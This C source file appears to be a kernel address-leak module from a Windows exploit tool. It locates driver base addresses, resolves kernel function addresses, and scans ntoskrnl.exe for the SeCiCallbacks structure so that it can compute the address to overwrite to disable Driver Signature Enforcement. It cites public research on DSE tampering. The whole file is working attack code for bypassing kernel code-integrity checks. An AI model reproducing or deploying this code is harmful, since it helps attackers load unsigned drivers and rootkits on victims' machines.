#include <Windows.h>
#include <Psapi.h>

#include "Leak.h"

unsigned long long GetBaseAddress(char* pTargetDriverName)
{
	void** pBaseAddresses = 0;
	char pDriverName[1024] = { 0 };

	unsigned long BytesReturned = 0;

	memset(pDriverName, 0, sizeof(pDriverName));

	EnumDeviceDrivers(0, 0, &BytesReturned);
	pBaseAddresses = malloc(BytesReturned);
	if (!pBaseAddresses)
	{
		return 0;
	}

	if (!EnumDeviceDrivers(pBaseAddresses, BytesReturned, &BytesReturned))
	{
		return 0;
	}

	for (unsigned long i = 0; i < BytesReturned / sizeof(void*); i++)
	{
		if (!GetDeviceDriverBaseNameA(pBaseAddresses[i], pDriverName, sizeof(pDriverName)))
		{
			continue;
		}

		if (strstr(pDriverName, pTargetDriverName))
		{
			return (unsigned long long)pBaseAddresses[i];
		}
	}

	return 0;
}

unsigned long long GetFunctionAddress(unsigned long long BaseAddress, char* pDriverName, char* pFunctionName)
{
	HMODULE hLibrary = 0;
	void* pFunction = 0;

	hLibrary = LoadLibraryExA(pDriverName, 0, DONT_RESOLVE_DLL_REFERENCES);
	if (!hLibrary)
	{
		return 0;
	}

	pFunction = (void*)GetProcAddress(hLibrary, pFunctionName);
	if (!pFunction)
	{
		FreeLibrary(hLibrary);
		return 0;
	}

	FreeLibrary(hLibrary);

	// If you're curious as to what this is, it simply calculates the offset from the load address of the module to the function.
	// Then, it adds the offset to the supplied base address to retrieve the real function address.
	return BaseAddress + ((unsigned long long)(pFunction) - (unsigned long long)(hLibrary));
}

// References:
// https://www.fortinet.com/blog/threat-research/driver-signature-enforcement-tampering
// https://blog.cryptoplague.net/main/research/windows-research/the-dusk-of-g_cioptions-circumventing-dse-with-vbs-enabled
unsigned long long GetDSEOverwriteAddress(unsigned long long BaseAddress)
{
	HMODULE hNT = 0;
	MODULEINFO ModuleInfo = { 0 };

	unsigned long long FoundLocation = 0;
	unsigned long OffsetToStruct = 0;
	unsigned long long TrueOffset = 0;

	memset(&ModuleInfo, 0, sizeof(ModuleInfo));

	hNT = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", 0, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNT)
	{
		return 0;
	}

	// This function does not work for images greater than 2.1 gigabytes.
	// This is because the module info structure uses a DWORD to store the image size.
	// Therefore, if you want this to work on any loaded module, you will have to reverse engineer this function and replicate it to work with 64-bit sizes.
	if (!GetModuleInformation(GetCurrentProcess(), hNT, &ModuleInfo, sizeof(ModuleInfo)))
	{
		FreeLibrary(hNT);
		return 0;
	}

	for (unsigned long i = 0; i < ModuleInfo.SizeOfImage; i++)
	{
		if (*(unsigned long long*)((unsigned char*)(hNT)+(unsigned long long)i) == SECICALLBACKS_SIGNATURE)
		{
			FoundLocation = (unsigned long long)(hNT) + i;
			break;
		}
	}
	if (!FoundLocation)
	{
		FreeLibrary(hNT);
		return 0;
	}

	OffsetToStruct = *(unsigned long*)((unsigned char*)(FoundLocation + 3));
	TrueOffset = (FoundLocation + 7 + OffsetToStruct) - (unsigned long long)(hNT) + 32;

	FreeLibrary(hNT);

	return BaseAddress + TrueOffset;
}